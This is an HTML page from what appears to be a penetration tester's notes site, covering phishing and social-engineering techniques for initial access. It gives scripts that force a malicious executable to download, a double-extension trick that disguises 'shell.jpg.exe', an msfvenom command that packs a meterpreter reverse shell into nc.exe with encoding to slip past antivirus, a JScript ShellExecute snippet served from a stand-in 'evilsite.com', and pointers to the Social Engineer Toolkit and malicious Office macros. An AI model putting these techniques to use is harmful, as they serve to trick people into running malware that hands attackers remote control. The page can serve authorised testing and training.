<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="xapax">
    
    <link rel="shortcut icon" href="../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Social Engineering and Phishing - Notes</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Social Engineering - Phishing", url: "#_top", children: [
              {title: "Auto-download a malicious file", url: "#auto-download-a-malicious-file" },
              {title: "Autodownload a malicious javascript-file", url: "#autodownload-a-malicious-javascript-file" },
              {title: "Phishing", url: "#phishing" },
              {title: "Word/excel makros", url: "#wordexcel-makros" },
              {title: "Reference:", url: "#reference" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../initial_access/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../initial_access/" class="btn btn-xs btn-link">
        Initial Access
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../phishing_server/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../phishing_server/" class="btn btn-xs btn-link">
        Setting Up Email-phishing-server
      </a>
    </div>
    
  </div>

    

    <h1 id="social-engineering-phishing">Social Engineering - Phishing<a class="headerlink" href="#social-engineering-phishing" title="Permanent link">#</a></h1>
<p>Gaining initial access to a network is often done using different kinds of social engineering attacks.</p>
<h2 id="auto-download-a-malicious-file">Auto-download a malicious file<a class="headerlink" href="#auto-download-a-malicious-file" title="Permanent link">#</a></h2>
<p>The techical part is not really that difficult here. In order to auto-download a file you just add this script to the malicious webpage</p>
<pre><code>&lt;script&gt; document.location.href = 'shell53.exe'; &lt;/script&gt;
</code></pre>

<p>Another way to do it is like this</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=shell53.exe&quot;&gt;
&lt;/head&gt;
&lt;/html&gt;
</code></pre>

<p>Of course the user will have to accept to download the file, unless the user has previously checked in the box automatically download. The user must then click the file for it to execute. This is where the social engineering part comes in, you really must trick the user into executing the file.</p>
<h3 id="change-the-filename">Change the filename<a class="headerlink" href="#change-the-filename" title="Permanent link">#</a></h3>
<p>Since windows by default remove the filename you can call your file shell.jpg.exe, and once downloaded onto the machine windows will display it as "shell.jpg".</p>
<h3 id="embed-malicious-code-in-legitimate-file">Embed malicious code in legitimate file<a class="headerlink" href="#embed-malicious-code-in-legitimate-file" title="Permanent link">#</a></h3>
<p>It is however very likely that this will be picked up by a antivirus.</p>
<pre><code>msfvenom -a x86 --platform windows -x nc.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lhost=53 -e x86/shikata_ga_nai -i 3 -b &quot;\x00&quot; -f exe -o ncMalicious.exe
</code></pre>

<h2 id="autodownload-a-malicious-javascript-file">Autodownload a malicious javascript-file<a class="headerlink" href="#autodownload-a-malicious-javascript-file" title="Permanent link">#</a></h2>
<p>Just like we can download an exe for a user to can also make that user download a javascript file. Since javascript files can execute commands on windows.</p>
<pre><code>var oShell = new ActiveXObject(&quot;Shell.Application&quot;);
var commandtoRun = &quot;C:\\Windows\\system32\\calc.exe&quot;;
oShell.ShellExecute(commandtoRun,&quot;&quot;,&quot;&quot;,&quot;open&quot;,&quot;1&quot;);
</code></pre>

<pre><code>http://evilsite.com/file.js
</code></pre>

<p>This code can be modified to greate a wget-script and then download and execute a script.</p>
<h2 id="phishing">Phishing<a class="headerlink" href="#phishing" title="Permanent link">#</a></h2>
<p>The most common tool for social engineering is to use Social Engineering Toolkit. SET. It comes as default in Kali. Run it like this:</p>
<pre><code>setoolkit
</code></pre>

<h2 id="wordexcel-makros">Word/excel makros<a class="headerlink" href="#wordexcel-makros" title="Permanent link">#</a></h2>
<p>An explanation of how to createa malicious makro-wordfile.</p>
<p>https://www.offensive-security.com/metasploit-unleashed/vbscript-infection-methods/</p>
<h2 id="reference">Reference:<a class="headerlink" href="#reference" title="Permanent link">#</a></h2>
<p>https://www.youtube.com/watch?v=NTdthBQYa1k</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../initial_access/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../initial_access/" class="btn btn-xs btn-link">
        Initial Access
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../phishing_server/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../phishing_server/" class="btn btn-xs btn-link">
        Setting Up Email-phishing-server
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
      <p>
        <a href="https://github.com/xapax/edit/master/docs/initial_access/social_engineering_-_phishing.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>